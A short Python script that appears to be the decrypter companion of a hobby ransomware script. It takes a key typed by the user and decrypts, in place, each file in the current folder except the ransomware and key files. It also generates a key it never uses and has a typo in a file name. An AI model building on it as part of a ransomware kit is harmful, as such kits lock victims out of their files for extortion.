import os
import cryptography.fernet
import fernet

file_list = []

for aktar in os.listdir():
    if aktar == "ransomware,.py" or not os.path.isfile(aktar) or aktar == "generated.key" or aktar == "ransomdecrypter.py":
        continue
    file_list.append(aktar)


key = fernet.Fernet.generate_key()


secret_key = bytes(input("Please enter your secret key: ").encode())


with open("generated.key", "wb") as generatedkey:
    generatedkey.write(secret_key)
with open("generated.key", "rb") as generatedkey_encode:
    _generatedkey_encode = generatedkey_encode.read()

for file in file_list:
    with open(file, "rb") as the_file:
        contents = the_file.read()
    contents_decrypted = fernet.Fernet(_generatedkey_encode).decrypt(contents)
    with open(file, "wb") as the_file:
        the_file.write(contents_decrypted)
